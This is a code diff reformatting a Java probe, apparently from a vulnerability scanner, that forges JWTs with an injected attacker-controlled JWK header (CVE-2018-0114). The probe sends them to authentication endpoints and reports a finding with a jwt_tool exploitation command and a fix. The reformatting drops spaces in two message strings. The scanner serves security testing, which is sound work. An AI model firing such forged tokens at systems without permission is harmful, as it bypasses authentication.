@@ -39,8 +39,8 @@ public class JwkInjectionProbe {
             String n = b64urlUnsigned(pub.getModulus());
             String e = b64urlUnsigned(pub.getPublicExponent());
 
-            String jwk = "{\"kty\":\"RSA\",\"kid\":\"anarcry-probe\",\"use\":\"sig\"," +
-                         "\"e\":\"" + e + "\",\"n\":\"" + n + "\"}";
+            String jwk = "{\"kty\":\"RSA\",\"kid\":\"anarcry-probe\",\"use\":\"sig\"," + "\"e\":\"" + e + "\",\"n\":\""
+                    + n + "\"}";
             String headerJson = "{\"alg\":\"RS256\",\"typ\":\"JWT\",\"jwk\":" + jwk + "}";
             String forgedHeader = Base64.getUrlEncoder().withoutPadding()
                     .encodeToString(headerJson.getBytes(StandardCharsets.UTF_8));
@@ -55,11 +55,9 @@ public class JwkInjectionProbe {
             log.accept("[~] JWT: JWK injection token forjado, enviando probes");
             for (String path : AUTH_PATHS) {
                 try {
-                    HttpRequest req = HttpRequest.newBuilder()
-                            .uri(URI.create(base + path))
-                            .header("Authorization", "Bearer " + forgedToken)
-                            .timeout(Duration.ofSeconds(5))
-                            .GET().build();
+                    HttpRequest req = HttpRequest.newBuilder().uri(URI.create(base + path))
+                            .header("Authorization", "Bearer " + forgedToken).timeout(Duration.ofSeconds(5)).GET()
+                            .build();
                     HttpResponse<Void> resp = Http.send(ctx, hc, req, HttpResponse.BodyHandlers.discarding(), "JWT");
                     log.accept("[~] JWT: JWK injection " + path + " → HTTP " + resp.statusCode());
                     if (resp.statusCode() == 200) {
@@ -69,10 +67,13 @@ public class JwkInjectionProbe {
                         double _score = CvssCalculator.calculate(_cvssVector);
                         return Optional.of(Finding.of("JWT", base + path,
                                 "JWK header injection aceita ativamente (CVE-2018-0114)", Severity.CRITICAL,
-                                "Probe em " + base + path + " → HTTP 200 com chave JWK attacker-controlled injetada no header",
-                                "Servidor confia na chave pública embutida no próprio token — atacante pode self-sign qualquer payload",
+                                "Probe em " + base + path
+                                        + " → HTTP 200 com chave JWK attacker-controlled injetada no header",
+                                "Servidor confia na chave pública embutida no próprio token — atacante pode self-sign"
+                                        + "qualquer payload",
                                 "python3 jwt_tool.py <token> -X i",
-                                "Ignorar o campo jwk no header do token; usar apenas chaves pré-configuradas no servidor",
+                                "Ignorar o campo jwk no header do token; usar apenas chaves pré-configuradas no"
+                                        + "servidor",
                                 _cweId, _cweTitle, _cvssVector, _score));
                     }
                 } catch (Exception ex) {
